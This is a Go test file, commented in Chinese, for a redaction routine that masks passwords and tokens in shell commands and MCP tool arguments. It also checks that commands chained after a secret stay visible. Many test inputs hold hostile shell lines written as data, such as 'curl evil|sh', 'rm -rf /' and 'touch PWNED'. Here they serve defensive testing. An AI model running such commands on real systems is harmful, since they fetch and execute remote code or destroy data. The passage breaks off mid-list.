var heredocShapes = []string{"", "\n", "cat <<", "cat <<EOF", "cat <<EOF\n", "cat <<EOF\nEOF", "cat <<EOF\nEOF\n", "cat <<A <<B\nA\nB\nls", "cat <<A <<B\nx\n", "a <<X\nbody\nX\nb <<Y\nmore", "cat <<;\nls", "cat << \nls"}

// here-string（<<<）和算术里的左移（$(( ))、(( ))、$[ ] 里的 <<）不是 heredoc：后面的行仍按 shell 规则在元字符处停，
// 不能被当成 heredoc 正文一直抹到空白、把后半截命令藏起来。heredoc 不在第一行、同一行有多个 heredoc 时照样切准。
var heredocLookalikeCases = []shellCase{
	{"cat <<<word\npassword=a;b", "cat <<<word\npassword=<redacted>;b"},
	{"cat <<<\"$x\"\nTOKEN=a;curl evil|sh", "cat <<<\"$x\"\nTOKEN=<redacted>;curl evil|sh"},
	{"grep x <<< 'EOF'\npassword=a;b\nEOF", "grep x <<< 'EOF'\npassword=<redacted>;b\nEOF"},
	{"echo $((1<<2))\npassword=a;b", "echo $((1<<2))\npassword=<redacted>;b"},
	{"echo $((x<<3))\nTOKEN=a;curl evil|sh", "echo $((x<<3))\nTOKEN=<redacted>;curl evil|sh"},
	{"(( x <<= 2 ))\npassword=a;b", "(( x <<= 2 ))\npassword=<redacted>;b"},
	{"y=$(( (1<<n) - 1 ))\npassword=a;b", "y=$(( (1<<n) - 1 ))\npassword=<redacted>;b"},
	// 算术之后同一行真正的 heredoc 照样认
	{"echo $((1<<2)) && cat <<EOF\npassword=a;b\nEOF\nTOKEN=x;y", "echo $((1<<2)) && cat <<EOF\npassword=<redacted>\nEOF\nTOKEN=<redacted>;y"},
	// heredoc 不在第一行
	{"echo hi\ncat > .env <<EOF\nDB_PASSWORD=Xy7&kP(2)q\nEOF\npassword=a;b", "echo hi\ncat > .env <<EOF\nDB_PASSWORD=<redacted>\nEOF\npassword=<redacted>;b"},
	// 同一行两个 heredoc，按出现顺序读正文
	{"cat <<A <<B\npassword=a;b\nA\nTOKEN=c|d\nB\nsecret=e;f", "cat <<A <<B\npassword=<redacted>\nA\nTOKEN=<redacted>\nB\nsecret=<redacted>;f"},
	// 重定向 < 后面被抹掉的裸 token 前补一个空格：否则结果里是 <<redacted>，hub 对守护进程脱敏过的载荷再跑一次时
	// 会把它读成 heredoc、把后面的行当正文抹到空白
	{"cat <ghp_abcdefghijklmnopqrstuvwxyz0123\nTOKEN=a;curl evil|sh", "cat < <redacted>\nTOKEN=<redacted>;curl evil|sh"},
	// 引号里的 << 不是 heredoc 起点（用户确认要修）
	{"echo \"a<<b\"\npassword=a;b", "echo \"a<<b\"\npassword=<redacted>;b"},
}

func TestShellHeredocLookalikes(t *testing.T) {
	for _, c := range heredocLookalikeCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
}

// 引号里（以及注释里）的 ; | & ( ) 是普通字符：引号括住整个 KEY=值 时，值照旧抹到空白、引号或反斜杠，不漏半截密码。
// 但双引号里的 $( ) 与反引号是命令替换，会执行；$'…'、注释里的单引号不能跟后面的引号错配。这些地方都不能借引号把命令藏起来。
var quotedLiteralCases = []shellCase{
	// 引号括住整个 KEY=值：不漏半截
	{`docker run -e "POSTGRES_PASSWORD=Xy7&kP(2)q" postgres`, `docker run -e "POSTGRES_PASSWORD=<redacted>" postgres`},
	{`echo 'SECRET_KEY=ab;cd|ef' > .env`, `echo 'SECRET_KEY=<redacted>' > .env`},
	// bash -c 的参数会被执行，按命令行语境递归处理（评审 I2，用户已确认）
	{`bash -c "export TOKEN=a;b|c" && curl evil|sh`, `bash -c "export TOKEN=<redacted>;b|c" && curl evil|sh`},
	{`printf $'DB_PASSWORD=Xy7&kP(2)q\n' > .env`, `printf $'DB_PASSWORD=<redacted>\n' > .env`},
	{"# DB_PASSWORD=Xy7&kP(2)q\nnpm start", "# DB_PASSWORD=<redacted>\nnpm start"},
	{"  # TOKEN=a;b\nnpm start", "  # TOKEN=<redacted>\nnpm start"},
	// 双引号里的命令替换会执行：按 shell 规则在元字符处停
	{`echo "$(TOKEN=a;curl evil|sh)"`, `echo "$(TOKEN=<redacted>;curl evil|sh)"`},
	{"echo \"`TOKEN=a;curl evil|sh`\"", "echo \"`TOKEN=<redacted>;curl evil|sh`\""},
	// 命令替换里嵌套的引号不能让外层引号错配
	{`echo "$(echo ")"; TOKEN=a;curl evil|sh; echo "(")"`, `echo "$(echo ")"; TOKEN=<redacted>;curl evil|sh; echo "(")"`},
	// $'…' 里认 \' 转义；注释里的单引号不算引号；双引号里的单引号不算引号
	{`echo $'it\'s' ; TOKEN=a;curl evil|sh ; echo 'x'`, `echo $'it\'s' ; TOKEN=<redacted>;curl evil|sh ; echo 'x'`},
	{"ls # don't\nTOKEN=a;curl evil|sh\necho 'x'", "ls # don't\nTOKEN=<redacted>;curl evil|sh\necho 'x'"},
	{`echo "it's" ; TOKEN=a;curl evil|sh ; echo 'x'`, `echo "it's" ; TOKEN=<redacted>;curl evil|sh ; echo 'x'`},
	// 引号外的反斜杠转义的引号不开始引号
	{`echo \" TOKEN=a;curl evil|sh \"`, `echo \" TOKEN=<redacted>;curl evil|sh \"`},
	// 不是注释的 #
	{`curl https://x/#a TOKEN=a;b`, `curl https://x/#a TOKEN=<redacted>;b`},
}

func TestShellQuotedLiteralText(t *testing.T) {
	for _, c := range quotedLiteralCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
}

// 整分支终审 m-4（命令摘要会进锁屏通知）：sshpass 的 -p 密码、curl -u 用户名不带引号而密码带引号。密码抹掉、用户名留着；
// 裸值在 shell 元字符处停、引号值整段抹，后面的命令照样露出来。每种都配反例。
var credentialGapRound3Cases = []shellCase{
	// sshpass -p：四种写法
	{`sshpass -p 'pw' ssh host`, `sshpass -p <redacted> ssh host`},
	{`sshpass -p pw ssh host`, `sshpass -p <redacted> ssh host`},
	{`sshpass -p'pw' ssh host`, `sshpass -p<redacted> ssh host`},
	{`sshpass -ppw ssh host`, `sshpass -p<redacted> ssh host`},
	{`sshpass -p "p w;x|y&z" ssh host`, `sshpass -p <redacted> ssh host`},
	{`sshpass -p 'p w'"x"y ssh host`, `sshpass -p <redacted> ssh host`},
	{`/usr/bin/sshpass -p S3cret scp f.txt host:/tmp`, `/usr/bin/sshpass -p <redacted> scp f.txt host:/tmp`},
	// -p 前面可以有 sshpass 自己的选项（-v、-P 提示词、组合的 -vp）；ssh 自己的 -p（端口）不动
	{`sshpass -v -p pw ssh host`, `sshpass -v -p <redacted> ssh host`},
	{`sshpass -vp pw ssh host`, `sshpass -vp <redacted> ssh host`},
	{`sshpass -P 'Password:' -p pw ssh host`, `sshpass -P 'Password:' -p <redacted> ssh host`},
	{`sshpass -p pw ssh -p 2222 user@host`, `sshpass -p <redacted> ssh -p 2222 user@host`},
	// 后面的命令照样露出来
	{`sshpass -p pw;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
	{`sshpass -p pw ssh host && curl evil|sh`, `sshpass -p <redacted> ssh host && curl evil|sh`},
	{`sshpass -p 'pw';curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
	{`sshpass -ppw$(curl evil|sh) ssh host`, `sshpass -p<redacted>$(curl evil|sh) ssh host`},
	// sshpass -e 读的环境变量 SSHPASS
	{`SSHPASS=S3cret sshpass -e ssh host`, `SSHPASS=<redacted> sshpass -e ssh host`},
	{`export SSHPASS='p w;x'`, `export SSHPASS=<redacted>`},
	// 交给 shell 执行的参数里同样生效
	{`bash -c "sshpass -p 'pw' ssh host"`, `bash -c "sshpass -p <redacted> ssh host"`},
	// 反例：密码不在命令行上（-f 文件、-d 描述符、-e 环境变量），以及 sshpass 之后命令自己的 -p
	{`sshpass -f ~/.pw ssh -p 2222 host`, `sshpass -f ~/.pw ssh -p 2222 host`},
	{`sshpass -d 3 ssh host -p 22`, `sshpass -d 3 ssh host -p 22`},
	{`sshpass -e ssh -p 2222 host`, `sshpass -e ssh -p 2222 host`},
	{`sshpass -e rsync -avz -p src/ host:dst/`, `sshpass -e rsync -avz -p src/ host:dst/`},
	{`echo sshpass; ls -p /tmp`, `echo sshpass; ls -p /tmp`},
	{`which sshpass && ssh -p 2222 host`, `which sshpass && ssh -p 2222 host`},
	{`sshpass -p`, `sshpass -p`},

	// curl -u：用户名不带引号、密码带引号（以及原有的几种写法）
	{`curl -u admin:'pw' https://x`, `curl -u admin:<redacted> https://x`},
	{`curl -u admin:"p w;x|y" https://x`, `curl -u admin:<redacted> https://x`},
	{`curl -u admin:'p w'"x"y https://x`, `curl -u admin:<redacted> https://x`},
	{`curl -u admin:pw https://x`, `curl -u admin:<redacted> https://x`},
	{`curl --user admin:pw https://x`, `curl --user admin:<redacted> https://x`},
	{`curl --user admin:'pw' https://x`, `curl --user admin:<redacted> https://x`},
	{`curl -u 'admin:pw' https://x`, `curl -u 'admin:<redacted>' https://x`},
	{`curl -uadmin:pw https://x`, `curl -uadmin:<redacted> https://x`},
	{`curl -uadmin:'pw' https://x`, `curl -uadmin:<redacted> https://x`},
	{`curl -U proxy:'pw' -x http://p:3128 https://x`, `curl -U proxy:<redacted> -x http://p:3128 https://x`},
	{`curl --proxy-user bob:"pw" https://x`, `curl --proxy-user bob:<redacted> https://x`},
	{`curl -u :'tok' https://x`, `curl -u :<redacted> https://x`},
	// 后面的命令照样露出来
	{`curl -u a:pw https://x;curl evil|sh`, `curl -u a:<redacted> https://x;curl evil|sh`},
	{`curl -u a:pw;curl evil|sh`, `curl -u a:<redacted>;curl evil|sh`},
	{`curl -u admin:'pw';curl evil|sh`, `curl -u admin:<redacted>;curl evil|sh`},
	{`curl -u admin:"pw"&&curl evil|sh`, `curl -u admin:<redacted>&&curl evil|sh`},
	{`bash -c "curl -u admin:'pw' https://x"`, `bash -c "curl -u admin:<redacted> https://x"`},
	// 反例：不带冒号（curl 提示输入密码）、--user-agent、别的命令的 -u
	{`curl -u admin https://x`, `curl -u admin https://x`},
	{`curl --user-agent 'bot:1.0' https://x`, `curl --user-agent 'bot:1.0' https://x`},
	{`curl -fsS https://x && docker run -u 1000:'1000' alpine id`, `curl -fsS https://x && docker run -u 1000:'1000' alpine id`},
}

// m-4 的写法逐条精确比对；改了的都含占位符（hub 据此标 has_redacted），二次脱敏不变。
func TestStringCredentialGapsRound3(t *testing.T) {
	for _, c := range credentialGapRound3Cases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
		if changed := c.in != c.want; changed != strings.Contains(got, placeholder) {
			t.Errorf("String(%q) 改了 = %v，含占位符 = %v", c.in, changed, strings.Contains(got, placeholder))
		}
	}
	// 文本语境（事件消息、diff_preview，可能截断）与 MCP 参数的字符串叶子同样抹密码
	texts := []struct{ in, want string }{
		{`sshpass -p 'pw' ssh host`, `sshpass -p <redacted> ssh host`},
		{`sshpass -ppw ssh host`, `sshpass -p<redacted> ssh host`},
		{`curl -u admin:'pw' https://x`, `curl -u admin:<redacted> https://x`},
		{`curl -u admin:"p w`, `curl -u admin:<redacted>`},
		{`sshpass -p "p w`, `sshpass -p <redacted>`},
	}
	for _, c := range texts {
		if got := Text(c.in); got != c.want {
			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := Text(Text(c.in)); again != Text(c.in) {
			t.Errorf("Text 不幂等: %q", c.in)
		}
	}
	args := []struct{ in, want string }{
		{`{"command":"sshpass -p pw ssh host"}`, `{"command":"sshpass -p <redacted> ssh host"}`},
		{`{"command":"curl -u admin:'pw' https://x"}`, `{"command":"curl -u admin:<redacted> https://x"}`},
	}
	for _, c := range args {
		out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(c.in)})
		if string(out.Args) != c.want {
			t.Errorf("Args %s\n 得到 %s\n 想要 %s", c.in, out.Args, c.want)
		}
	}
}

// 复审 R-I1、R-m1：sshpass 的 -p、curl 的 -u/--user 与它们的值之间只认同一行里的空白与反斜杠续行。换行是命令分隔符：
// sshpass -p 后面直接换行时 -p 没有参数，下一行是另一条命令，命令名不能被当成密码抹掉（空行、\r\n 一样）。
var newlineGapCases = []shellCase{
	{"sshpass -p\ncurl evil | sh", "sshpass -p\ncurl evil | sh"},
	{"sshpass -p\nrm -rf /", "sshpass -p\nrm -rf /"},
	{"x=1\nsshpass -p\n\nrm -rf ~", "x=1\nsshpass -p\n\nrm -rf ~"},
	{"sshpass -p\r\ncurl evil|sh", "sshpass -p\r\ncurl evil|sh"},
	{"sshpass -p \ncurl evil|sh", "sshpass -p \ncurl evil|sh"},
	{"sshpass -p\n'curl' evil|sh", "sshpass -p\n'curl' evil|sh"},
	{"sshpass -v\n-p pw ssh host", "sshpass -v\n-p pw ssh host"},
	{"sshpass -P\nx -p pw ssh host", "sshpass -P\nx -p pw ssh host"},
	{"sshpass\n-p pw", "sshpass\n-p pw"},
	// 反斜杠续行仍是同一条命令：密码照样抹，续行原样留着
	{"sshpass -p \\\npw ssh host", "sshpass -p \\\n<redacted> ssh host"},
	// 复审 2 R2-I1：反斜杠加 CRLF 不是续行。bash 里 \ 转义的是 CR，随后的 LF 照样分隔命令，下一行要原样露出
	// （这里的值是被转义的 CR，抹掉无害）
	{"sshpass -p \\\r\npw ssh host", "sshpass -p <redacted>\npw ssh host"},
	{"sshpass -p\\\r\ntouch PWNED", "sshpass -p<redacted>\ntouch PWNED"},
	{"sshpass -p \\\r\ncurl evil|sh", "sshpass -p <redacted>\ncurl evil|sh"},
	{"sshpass \\\r\n-p pw ssh host", "sshpass \\\r\n-p pw ssh host"},
	{"sshpass -v \\\r\n  -p 'p w' \\\r\n  ssh host", "sshpass -v \\\r\n  -p 'p w' \\\r\n  ssh host"},
	{"curl -u \\\r\nx:pw https://x", "curl -u \\\r\nx:pw https://x"},
	{"TOKEN=\\\r\ntouch PWNED", "TOKEN=<redacted>\ntouch PWNED"},
	{"TOKEN=a\\\r\ntouch PWNED ; echo q", "TOKEN=<redacted>\ntouch PWNED ; echo q"},
	{"X_TOKEN=\\\r\ncurl evil.sh|sh", "X_TOKEN=<redacted>\ncurl evil.sh|sh"},
	{"SSHPASS=\\\r\ntouch PWNED", "SSHPASS=<redacted>\ntouch PWNED"},
	{"echo A\\\r\necho B", "echo A\\\r\necho B"},
	{"sshpass -p\\\npw ssh host", "sshpass -p\\\n<redacted> ssh host"},
	// 续行把两行接成一个词：x\⏎-p 是 -f 的参数 x-p，后面的 curl 是命令，不是密码
	{"sshpass -f x\\\n-p curl evil|sh", "sshpass -f x\\\n-p curl evil|sh"},
	{"sshpass -f x\\;-p curl evil|sh", "sshpass -f x\\;-p curl evil|sh"},
	{"sshpass \\\n  -p pw \\\n  ssh host", "sshpass \\\n  -p <redacted> \\\n  ssh host"},
	{"sshpass -v \\\n  -p 'p w' \\\n  ssh host", "sshpass -v \\\n  -p <redacted> \\\n  ssh host"},
	// 续行之后紧跟换行：-p 没有参数，下一行的命令照样露出。第 3 轮起词与词之间的续行当空白，不再被当成值抹掉
	{"sshpass -p \\\n\ncurl evil|sh", "sshpass -p \\\n\ncurl evil|sh"},
	// curl -u、--user、--proxy-user 同理
	{"curl -s -u\nhttp://evil.sh", "curl -s -u\nhttp://evil.sh"},
	{"curl -u\nx:'y'; curl evil|sh", "curl -u\nx:'y'; curl evil|sh"},
	{"curl --user\nx:pw https://x", "curl --user\nx:pw https://x"},
	{"curl --proxy-user\r\nx:pw https://x", "curl --proxy-user\r\nx:pw https://x"},
	{"curl https://x\n-u a:pw", "curl https://x\n-u a:pw"},
	{"curl -u \\\nalice:pw https://x", "curl -u \\\nalice:<redacted> https://x"},
	{"curl https://x \\\n-u alice:pw", "curl https://x \\\n-u alice:<redacted>"},
}

func TestStringNewlineEndsOptionValue(t *testing.T) {
	for _, c := range newlineGapCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
		if changed := c.in != c.want; changed != strings.Contains(got, placeholder) {
			t.Errorf("String(%q) 改了 = %v，含占位符 = %v", c.in, changed, strings.Contains(got, placeholder))
		}
	}
	// 文本语境（事件消息、diff_preview，可能截断）：续行按原文留着，只抹密码
	texts := []struct{ in, want string }{
		{"sshpass -p\ncurl evil | sh", "sshpass -p\ncurl evil | sh"},
		{"sshpass -p\r\ncurl evil|sh", "sshpass -p\r\ncurl evil|sh"},
		{"x=1\nsshpass -p\n\nrm -rf ~", "x=1\nsshpass -p\n\nrm -rf ~"},
		{"sshpass -v\n-p pw ssh host", "sshpass -v\n-p pw ssh host"},
		{"sshpass -p \\\npw ssh host", "sshpass -p \\\n<redacted> ssh host"},
		{"sshpass -p \\\r\npw ssh host", "sshpass -p <redacted>\r\npw ssh host"},
		{"sshpass -p \\\r\ncurl evil|sh", "sshpass -p <redacted>\r\ncurl evil|sh"},
		{"sshpass \\\r\n-p pw ssh host", "sshpass \\\r\n-p pw ssh host"},
		{"curl -u \\\r\nx:pw https://x", "curl -u \\\r\nx:pw https://x"},
		{"TOKEN=\\\r\ntouch PWNED", "TOKEN=<redacted>\r\ntouch PWNED"},
		{"sshpass \\\n  -p pw \\\n  ssh host", "sshpass \\\n  -p <redacted> \\\n  ssh host"},
		{"sshpass -f x\\\n-p curl evil|sh", "sshpass -f x\\\n-p curl evil|sh"},
		{"curl -s -u\nhttp://evil.sh", "curl -s -u\nhttp://evil.sh"},
		{"curl -u\nx:'y'; curl evil|sh", "curl -u\nx:'y'; curl evil|sh"},
		{"curl --user\nx:pw https://x", "curl --user\nx:pw https://x"},
		{"curl https://x\n-u a:pw", "curl https://x\n-u a:pw"},
		{"curl -u \\\nalice:pw https://x", "curl -u \\\nalice:<redacted> https://x"},
	}
	for _, c := range texts {
		if got := Text(c.in); got != c.want {
			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := Text(Text(c.in)); again != Text(c.in) {
			t.Errorf("Text 不幂等: %q", c.in)
		}
	}
	// MCP 参数里普通键的字符串叶子（textRules）；装命令的键（command 等）按命令行语境，见 TestMCPShellCommandFieldsUseShellContext
	args := []struct{ in, want string }{
		{`{"input":"sshpass -p\ncurl evil|sh"}`, `{"input":"sshpass -p\ncurl evil|sh"}`},
		{`{"input":"sshpass -p\r\n\r\nrm -rf ~"}`, `{"input":"sshpass -p\r\n\r\nrm -rf ~"}`},
		{`{"input":"curl -u\nx:'y'; curl evil|sh"}`, `{"input":"curl -u\nx:'y'; curl evil|sh"}`},
		{`{"input":"sshpass -p \\\npw ssh host"}`, `{"input":"sshpass -p \\\n<redacted> ssh host"}`},
		{`{"input":"sshpass -p \\\r\ncurl evil|sh"}`, `{"input":"sshpass -p <redacted>\r\ncurl evil|sh"}`},
		{`{"input":"curl -u \\\r\nx:pw https://x"}`, `{"input":"curl -u \\\r\nx:pw https://x"}`},
		{`{"input":"curl -u \\\nalice:pw https://x"}`, `{"input":"curl -u \\\nalice:<redacted> https://x"}`},
		// command 键按命令行语境，与上面 String 的用例一致：\ 加 CRLF 不是续行，被转义的 CR 当值抹掉，下一行照样露出
		{`{"command":"sshpass -p\ncurl evil|sh"}`, `{"command":"sshpass -p\ncurl evil|sh"}`},
		{`{"command":"sshpass -p\r\n\r\nrm -rf ~"}`, `{"command":"sshpass -p\r\n\r\nrm -rf ~"}`},
		{`{"command":"curl -u\nx:'y'; curl evil|sh"}`, `{"command":"curl -u\nx:'y'; curl evil|sh"}`},
		{`{"command":"sshpass -p \\\npw ssh host"}`, `{"command":"sshpass -p \\\n<redacted> ssh host"}`},
		{`{"command":"sshpass -p \\\r\ncurl evil|sh"}`, `{"command":"sshpass -p <redacted>\ncurl evil|sh"}`},
		{`{"command":"curl -u \\\r\nx:pw https://x"}`, `{"command":"curl -u \\\r\nx:pw https://x"}`},
		{`{"command":"curl -u \\\nalice:pw https://x"}`, `{"command":"curl -u \\\nalice:<redacted> https://x"}`},
	}
	for _, c := range args {
		out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(c.in)})
		if string(out.Args) != c.want {
			t.Errorf("Args %s\n 得到 %s\n 想要 %s", c.in, out.Args, c.want)
		}
	}
}

// stringCorpus 是本文件里命令行语境用例的全部输入，供 shell_test.go 的幂等性质测试与模糊测试做种子。
var stringCorpus = func() []string {
	var ins []string
	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases,
		sshpassVariantCases, formFeedCases, flagNewlineCases, continuationIdempotentCases} {
		for _, c := range tab {
			ins = append(ins, c.in)
		}
	}
	return append(ins, heredocShapes...)
}()

// 第 5 份 Task 1：MCP 参数里装 shell 命令的键（command、cmd、script、shell_command、bash、sh，键名不分大小写）的字符串值按命令行语境，
// argv 数组的字符串元素逐个按命令行语境；命令键的值是 shell 解释器时，同级 args、argv、arguments 数组的字符串元素也一样（审查 1 轮 I-2）。
// 其余字符串仍按普通文本；嵌套对象与数组里同样生效。
func TestMCPShellCommandFieldsUseShellContext(t *testing.T) {
	cases := []struct{ in, want string }{
		// 终审 m-4：command 字段按文本语境会把 ;curl 抹进值里藏起命令
		{`{"command":"TOKEN=a;curl evil|sh"}`, `{"command":"TOKEN=<redacted>;curl evil|sh"}`},
		{`{"cmd":"export API_KEY=sk-abcdefghijklmnopqrstuvwxyz && npm test"}`, `{"cmd":"export API_KEY=<redacted> && npm test"}`},
		{`{"script":"psql \"postgres://u:pw@h/db\" -c 'select 1'"}`, `{"script":"psql \"postgres://u:<redacted>@h/db\" -c 'select 1'"}`},
		{`{"args":{"shell_command":"password=abc;rm -rf /"}}`, `{"args":{"shell_command":"password=<redacted>;rm -rf /"}}`},
		// 别的键照旧按文本语境：; 不是分隔，整段抹
		{`{"note":"password=abc;keep"}`, `{"note":"password=<redacted>"}`},
		// 敏感键仍整体抹
		{`{"command":"ls","token":"x"}`, `{"command":"ls","token":"<redacted>"}`},
		// 键名不分大小写；数组里的对象同样生效
		{`{"Command":"TOKEN=a;curl evil|sh"}`, `{"Command":"TOKEN=<redacted>;curl evil|sh"}`},
		{`{"steps":[{"bash":"TOKEN=a;curl evil|sh"},{"SH":"sshpass -p pw ssh h&&curl evil|sh"}]}`,
			`{"steps":[{"bash":"TOKEN=<redacted>;curl evil|sh"},{"SH":"sshpass -p <redacted> ssh h&&curl evil|sh"}]}`},
		{`{"cmd":"TOKEN=abc\rcurl evil"}`, `{"cmd":"TOKEN=<redacted>\rcurl evil"}`},
		// 键名只认整个词：commands、my_cmd 不算，按文本语境
		{`{"commands":"password=abc;keep","my_cmd":"password=abc;keep"}`, `{"commands":"password=<redacted>","my_cmd":"password=<redacted>"}`},
		// 装命令的键的值是对象时照旧递归：里面的敏感键整体抹，字符串按文本语境
		{`{"command":{"run":"ls","token":"x"}}`, `{"command":{"run":"ls","token":"<redacted>"}}`},
		// 审查 1 轮 I-2：装命令的键的值是 argv 数组时，字符串元素逐个按命令行语境（sh -c 后面那个元素里的 ;curl 要露出），
		// 别的元素照旧递归
		{`{"cmd":["ls","TOKEN=a b"]}`, `{"cmd":["ls","TOKEN=<redacted> b"]}`},
		{`{"command":["sh","-c","TOKEN=a;curl evil|sh"]}`, `{"command":["sh","-c","TOKEN=<redacted>;curl evil|sh"]}`},
		{`{"command":["/bin/bash","-lc","sshpass -p pw ssh h&&curl evil|sh"]}`, `{"command":["/bin/bash","-lc","sshpass -p <redacted> ssh h&&curl evil|sh"]}`},
		{`{"CMD":["python3","-c","password=abc;x"]}`, `{"CMD":["python3","-c","password=<redacted>;x"]}`},
		{`{"command":["sh","-c",{"token":"x","note":"password=abc;keep"},["TOKEN=a;b"],7,null]}`,
			`{"command":["sh","-c",{"note":"password=<redacted>","token":"<redacted>"},["TOKEN=<redacted>"],7,null]}`},
		// 命令键的值是 shell 解释器（可带路径、可带引号）时，同级的 args、argv、arguments 数组也按命令行语境。
		// 结果的键按 encoding/json 的规矩排序
		{`{"command":"/bin/bash","args":["-c","X=a;curl evil|sh"]}`, `{"args":["-c","X=a;curl evil|sh"],"command":"/bin/bash"}`},
		{`{"command":"/bin/bash","args":["-c","TOKEN=a;curl evil|sh"]}`, `{"args":["-c","TOKEN=<redacted>;curl evil|sh"],"command":"/bin/bash"}`},
		{`{"cmd":"sh","argv":["-c","TOKEN=a;curl evil|sh"]}`, `{"argv":["-c","TOKEN=<redacted>;curl evil|sh"],"cmd":"sh"}`},
		{`{"Command":"\"zsh\"","Arguments":["-c","TOKEN=a;curl evil|sh"]}`, `{"Arguments":["-c","TOKEN=<redacted>;curl evil|sh"],"Command":"\"zsh\""}`},
		{`{"command":" '/usr/local/bin/dash' ","args":["-c","TOKEN=a;curl evil|sh",{"token":"x"}]}`,
			`{"args":["-c","TOKEN=<redacted>;curl evil|sh",{"token":"<redacted>"}],"command":" '/usr/local/bin/dash' "}`},
		// 别的解释器（python、node）的 args 仍按文本语境：; 不是分隔，整段抹
		{`{"command":"python","args":["-c","password=abc;x"]}`, `{"args":["-c","password=<redacted>"],"command":"python"}`},
		{`{"command":"node","argv":["-e","password=abc;x"]}`, `{"argv":["-e","password=<redacted>"],"command":"node"}`},
		// args 不是数组、键名不是那三个（params）、shell 名只是前缀（bashful）时都不算
		{`{"command":"bash","args":"password=abc;x","params":["password=abc;x"]}`, `{"args":"password=<redacted>","command":"bash","params":["password=<redacted>"]}`},
		{`{"command":"bashful","args":["password=abc;x"]}`, `{"args":["password=<redacted>"],"command":"bashful"}`},
		// 敏感键整体抹的规则优先
		{`{"command":"bash","args":["-c","ls"],"token":"x","password":["a;b"]}`, `{"args":["-c","ls"],"command":"bash","password":"<redacted>","token":"<redacted>"}`},
	}
	for _, c := range cases {
		got := string(args(json.RawMessage(c.in)))
		if got != c.want {
			t.Errorf("args(%s)\n 得到 %s\n 想要 %s", c.in, got, c.want)
		}
		// hub 对守护进程脱敏过的载荷再跑一次，结果不变
		if again := string(args(json.RawMessage(got))); again != got {
			t.Errorf("args 不幂等: %s → %s", got, again)
		}
		if !json.Valid([]byte(got)) {
			t.Errorf("args(%s) 结果不是合法 JSON: %s", c.in, got)
		}
	}
}

// 第 5 份 Task 1：sshpass 的命令名带引号、大小写不同，-p 前有别的选项（含 sshpass 不认的 -o），-p 紧贴密码。
var sshpassVariantCases = []shellCase{
	{`sshpass -p hunter2 ssh prod`, `sshpass -p <redacted> ssh prod`},
	{`"sshpass" -p hunter2 ssh prod`, `"sshpass" -p <redacted> ssh prod`},
	{`'sshpass' -p hunter2 ssh prod`, `'sshpass' -p <redacted> ssh prod`},
	{`SSHPASS -p hunter2 ssh prod`, `SSHPASS -p <redacted> ssh prod`},
	{`sshpass -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
	{`sshpass -v -phunter2 ssh prod`, `sshpass -v -p<redacted> ssh prod`},
	{`sshpass -p 'a b' ssh prod`, `sshpass -p <redacted> ssh prod`},
	{`curl -u admin:'pw;x' https://h`, `curl -u admin:<redacted> https://h`},
	// 命令里的 sshpass 后半截命令不能被藏
	{`sshpass -p a;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
	// 第 2 轮 A：不是命令位置的 sshpass 按窄规则认（小写、不带引号、紧跟 -p、前一个词不以 - 开头）。echo 的参数会被多抹一个词，
	// 这是为了 ssh jump sshpass -p pw 这类扫描器不认的前缀之后照样抹密码而接受的取舍：多抹的是参数，不藏命令
	{`echo sshpass -p literal`, `echo sshpass -p <redacted>`},
	// -o 是 ssh 的选项，sshpass 不认、报错退出：跳过它和它后面的一个词，-p 的密码照样抹
	{`sshpass -o StrictHostKeyChecking=no -p 'p w' ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
	{`sshpass -oStrictHostKeyChecking=no -p pw ssh prod`, `sshpass -oStrictHostKeyChecking=no -p <redacted> ssh prod`},
	{`sshpass -o -p pw ssh prod`, `sshpass -o -p <redacted> ssh prod`},
	{`sshpass -v -o UserKnownHostsFile=/dev/null -P 'Password:' -p pw ssh prod`, `sshpass -v -o UserKnownHostsFile=/dev/null -P 'Password:' -p <redacted> ssh prod`},
	{`"/usr/bin/sshpass" -p pw ssh prod`, `"/usr/bin/sshpass" -p <redacted> ssh prod`},
	{`sudo SshPass -ppw ssh prod`, `sudo SshPass -p<redacted> ssh prod`},
	{`"SSHPASS" -v -p'p;w' ssh prod;curl evil|sh`, `"SSHPASS" -v -p<redacted> ssh prod;curl evil|sh`},
	{`bash -c "'sshpass' -p pw ssh h"`, `bash -c "'sshpass' -p <redacted> ssh h"`},
	// 跳过的选项参数里有别的规则先抹掉的值（PasswordAuthentication= 也是敏感键名），后面的 -p 照样抹
	{`sshpass -o PasswordAuthentication=yes -p pw ssh h`, `sshpass -o PasswordAuthentication=<redacted> -p <redacted> ssh h`},
	{`sshpass -P token=x -p pw ssh h`, `sshpass -P token=<redacted> -p <redacted> ssh h`},
	{`sshpass -o "PasswordAuthentication yes" -p pw ssh h`, `sshpass -o "PasswordAuthentication yes" -p <redacted> ssh h`},
	// 后面的命令照样露出来：值与跳过的选项参数都在 shell 元字符处停，不跨换行
